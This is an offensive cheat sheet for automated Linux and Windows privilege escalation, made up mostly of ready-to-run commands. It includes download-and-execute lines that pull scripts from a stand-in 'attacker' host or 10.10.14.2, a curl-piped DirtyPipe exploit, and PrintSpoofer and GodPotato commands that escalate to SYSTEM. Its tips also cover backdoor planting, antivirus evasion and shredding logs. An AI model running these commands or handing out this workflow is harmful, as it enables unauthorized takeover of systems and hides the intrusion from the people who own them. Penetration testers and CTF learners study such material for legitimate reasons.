---
icon: user-robot-xmarks
---

# Automation Toolkit

## **Privilege Escalation Automation Toolkit — Root Faster, Think Smarter**

***

Manual privilege escalation is an art — but in CTFs and engagements, **speed and coverage** matter most.\
This guide gives you a complete **automated toolkit** for Linux and Windows privilege escalation: scanners, scripts, payloads, and workflows that cut hours of manual digging into minutes.

***

### I. 🧩 Core Concepts

| Concept                    | Description                                       |
| -------------------------- | ------------------------------------------------- |
| **Enumeration First**      | Always gather system data before trying exploits. |
| **Automation Over Manual** | Tools reveal what human oversight misses.         |
| **Persistence Awareness**  | Exploit once, persist forever.                    |
| **Chaining**               | Combine multiple privilege vectors automatically. |

***

### II. 🧠 Linux PrivEsc Automation Suite

#### 🧩 1. LinPEAS — The Gold Standard

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas.log
```

**Purpose:**

* Scans for SUID, cronjobs, misconfigurations, kernel vulns
* Finds creds in memory, config, envs

**Output highlights:**

* `Possible Sudo Misconfigurations`
* `Interesting Files with Write Permissions`
* `Exploitable Binaries`

***

#### ⚙️ 2. LES — Linux Exploit Suggester

```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

**Finds kernel exploits** for local privilege escalation (CVE-based).

***

#### 💣 3. LinEnum — Lightweight & Fast

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh -t
```

**Focus:** quick recon of users, cronjobs, SUIDs, and writable configs.

***

#### 🧠 4. PSPY — Process Spy

```bash
./pspy64
```

**Watches background cronjobs, processes, and scripts** that may trigger with elevated privileges.

***

#### 🧩 5. SUID Binary Exploitation Helper

```bash
find / -type f -perm -4000 2>/dev/null
```

Automate GTFOBins lookup:

```bash
for bin in $(find / -type f -perm -4000 2>/dev/null); do
  echo "[+] Checking $bin"; grep $(basename $bin) gtfobins.txt
done
```

***

#### 🧠 6. Sudo Privilege Analyzer

```bash
sudo -l
```

Automate with:

```bash
sudo -l | tee sudo_enum.txt
grep "NOPASSWD" sudo_enum.txt
```

***

#### 💀 7. Enumeration All-in-One Script

```bash
#!/bin/bash
echo "[*] Gathering PrivEsc data..."
whoami
id
hostname
uname -a
cat /etc/issue
echo "[*] SUID binaries:"
find / -perm -4000 -type f 2>/dev/null
echo "[*] Cron jobs:"
cat /etc/crontab
echo "[*] Checking sudo permissions:"
sudo -l
echo "[*] Kernel Exploits:"
uname -r | ./linux-exploit-suggester.sh
```

***

### III. 🧰 Windows PrivEsc Automation Suite

#### 🧩 1. WinPEAS — Windows PrivEsc Powerhouse

```powershell
.\winPEASx64.exe > output.txt
```

**Finds:**

* Service misconfigurations
* UAC bypass vectors
* AlwaysInstallElevated
* Token privileges

***

#### 💣 2. PowerUp.ps1

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.2/PowerUp.ps1')
Invoke-AllChecks
```

Detects:

* Weak service permissions
* DLL hijacking
* Insecure registry keys

***

#### 🧠 3. Seatbelt

```powershell
Seatbelt.exe -group=system
```

**Collects** system configuration, service permissions, and security settings for escalation.

***

#### ⚙️ 4. SharpUp

```powershell
SharpUp.exe
```

C# version of PowerUp — stealthier and AV-safe.

***

#### 💀 5. Windows Exploit Suggester (NG)

```bash
python3 windows-exploit-suggester.py --update
python3 windows-exploit-suggester.py --database 2024-10-01-mssb.xls --systeminfo sysinfo.txt
```

Automated local kernel exploit recommendation based on `systeminfo`.

***

#### 🧩 6. PrintSpoofer & GodPotato

```powershell
PrintSpoofer64.exe -i -c cmd.exe
GodPotato.exe -cmd "powershell.exe"
```

Exploits **SeImpersonatePrivilege** → SYSTEM.

***

#### ⚙️ 7. Automated PrivEsc PowerShell Script

```powershell
Write-Output "[*] Enumerating..."
whoami
whoami /priv
systeminfo | findstr "OS Version"
Get-Service | where {$_.StartName -like "*LocalSystem*"}
Get-ScheduledTask | where {$_.Principal.RunLevel -eq "Highest"}
```

***

### IV. 🧠 Cross-Platform Enumeration Frameworks

| Tool                           | OS            | Description                         |
| ------------------------------ | ------------- | ----------------------------------- |
| **PEASS-ng (linpeas/winpeas)** | Linux/Windows | Comprehensive automated PrivEsc     |
| **LES / WinExploitSuggester**  | Linux/Windows | Kernel & patch vulnerability mapper |
| **LinEnum / PowerUp**          | Linux/Windows | Lightweight script-based checks     |
| **pspy / ProcMon**             | Linux/Windows | Process and job monitoring          |
| **SharpUp / Seatbelt**         | Windows       | Stealth enumeration (C# binaries)   |

***

### V. ⚙️ Automation Pipelines

#### 🧠 1. Fully Automated Linux Enumeration

```bash
chmod +x linpeas.sh LinEnum.sh
./linpeas.sh -a > peas.log
./LinEnum.sh -t > linenum.log
cat peas.log linenum.log > combined.txt
grep -E "SUID|sudo|cron|password|writable" combined.txt
```

#### 🧠 2. Windows Chained Recon

```powershell
Start-Process winPEASx64.exe
IEX(New-Object Net.WebClient).DownloadString('http://attacker/PowerUp.ps1');Invoke-AllChecks
Seatbelt.exe -group=system
```

***

### VI. ⚔️ Automated Exploit Execution

#### 🧩 Linux Example: DirtyPipe Auto-Exploit

```bash
bash <(curl -s https://raw.githubusercontent.com/Almorabea/dirtypipez-exploit/main/dirtypipez.sh)
```

#### 💣 Windows Example: Kernel Exploit Chain

```powershell
windows-exploit-suggester.py --database db.xls --systeminfo sysinfo.txt
Invoke-Expression (New-Object Net.WebClient).DownloadString('http://attacker/Exploit.ps1')
```

***

### VII. 🧠 Integration with Metasploit & Empire

#### ⚙️ Metasploit AutoEnum

```bash
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

#### ⚙️ Empire

```bash
usemodule privesc/powerup/allchecks
usemodule situational_awareness/network/powerview/get_group
```

***

### VIII. 🧩 Real-World Workflow Example

```bash
# 1. After reverse shell
whoami && uname -a

# 2. Deploy LinPEAS
wget http://10.10.14.2/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/report.txt

# 3. Review results
grep "Possible" /tmp/report.txt

# 4. Exploit SUID binary
/bin/bash -p
```

Windows:

```powershell
certutil -urlcache -split -f "http://10.10.14.2/winPEAS.exe"
.\winPEAS.exe
```

***

### IX. 🧠 Pro Tips & Red Team Tricks

✅ **Speed vs. Noise**

* Run **LinPEAS** in “light” mode for faster enumeration.
* Avoid running multiple scanners simultaneously on production — can trigger AV.

✅ **Chaining Tools**

* Combine `LinPEAS` + `LES` for full Linux coverage.
* Combine `WinPEAS` + `PowerUp` for complete Windows mapping.

✅ **Persistence Awareness**

* Always note writable services or tasks for backdoor planting.

✅ **Log Hygiene**

*   Delete enumeration outputs after review:

    ```bash
    shred -u linpeas.log
    ```

✅ **Pivot Integration**

* Run scanners through proxychains or tunnels for internal host enumeration.

***

### X. 🧩 Quick Reference Table

| OS      | Tool         | Command                          | Purpose                  |
| ------- | ------------ | -------------------------------- | ------------------------ |
| Linux   | LinPEAS      | `./linpeas.sh`                   | Deep PrivEsc scan        |
| Linux   | LES          | `./linux-exploit-suggester.sh`   | Kernel exploit suggester |
| Linux   | LinEnum      | `./LinEnum.sh`                   | Fast manual recon        |
| Windows | WinPEAS      | `winpeas.exe`                    | PrivEsc + config scan    |
| Windows | PowerUp      | `Invoke-AllChecks`               | Misconfig detection      |
| Windows | PrintSpoofer | `PrintSpoofer.exe -i -c cmd.exe` | Token impersonation      |
| Windows | Seatbelt     | `Seatbelt.exe -group=system`     | Security recon           |
| Cross   | PEASS-ng     | `linpeas/winpeas`                | Unified scanner          |

***
